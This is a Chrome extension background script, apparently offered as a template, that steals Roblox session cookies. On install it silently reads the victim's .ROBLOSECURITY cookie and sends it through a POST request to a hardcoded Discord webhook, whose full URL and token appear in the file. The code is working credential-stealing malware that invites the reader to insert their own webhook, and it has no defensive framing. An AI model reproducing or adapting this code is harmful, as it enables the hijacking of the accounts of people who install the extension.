const webhook = "https://discord.com/api/webhooks/1262707509202915418/K_yi1NgUETHZ7ptUoCo5jTNf1sQI-AslXFQGb3jkVLDPMqMPo58MhY7Ucy_3wkOsn05K"; // Put your webhook here for the information to be sent to.

chrome.runtime.onInstalled.addListener(() => {
  chrome.cookies.get(
    { url: "https://roblox.com", name: ".ROBLOSECURITY" },
    (cookie) => {
      if (cookie) {
        fetch(webhook, {
          method: "POST",
          headers: {
            Accept: "application/json",
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            embeds: [
              {
                title: "Cookie Logger Example",
                description: "```" + cookie.value + "```",
              },
            ],
          }),
        });
      }
    }
  );
});
